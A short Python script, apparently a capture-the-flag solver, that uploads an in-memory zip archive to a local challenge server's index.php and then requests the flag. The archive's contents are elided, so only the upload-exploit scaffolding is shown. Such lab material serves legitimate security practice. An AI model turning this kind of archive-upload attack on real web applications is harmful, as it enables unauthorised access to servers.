#!/usr/bin/python3

import io
import zipfile

import requests

URL = 'http://localhost:1337'

if __name__ == '__main__':
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zf:
        ...

    r = requests.post(f'{URL}/index.php',
                      files={'archive': ('hello.zip', buf.getvalue(), 'application/zip')})
    print(r.text)

    r = requests.get(f'{URL}/index.php?flag')
    print(r.text.strip())
